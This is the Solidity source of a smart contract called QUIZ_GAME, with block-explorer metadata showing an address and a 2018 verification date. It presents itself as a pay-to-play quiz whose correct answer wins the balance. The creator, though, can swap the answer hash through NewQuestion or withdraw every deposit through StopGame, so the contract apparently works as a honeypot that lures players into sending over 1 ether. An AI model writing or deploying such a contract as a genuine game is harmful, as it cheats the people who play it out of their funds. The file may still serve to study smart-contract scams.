
//Address: 0xa48a36d94024f861b453267468b9096e4a3eb8be
//Contract name: QUIZ_GAME
//Balance: 0 Ether
//Verification Date: 4/18/2018
//Transacion Count: 2

// CODE STARTS HERE

pragma solidity ^0.4.19;

contract QUIZ_GAME
{
    string public question;
 
    address questionSender;
  
    bytes32 responseHash;
 
    function StartGame(string _question,string _response)
    public
    payable
    {
        if(responseHash==0x00)
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    
    function Play(string _response)
    external
    payable
    {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>1 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    
    function StopGame()
    public
    payable
    {
       require(msg.sender==questionSender);
       msg.sender.transfer(this.balance);
    }
    
    function NewQuestion(string _question, bytes32 _responseHash)
    public
    payable
    {
        require(msg.sender==questionSender);
        question = _question;
        responseHash = _responseHash;
    }
    
    function() public payable{}
    
}
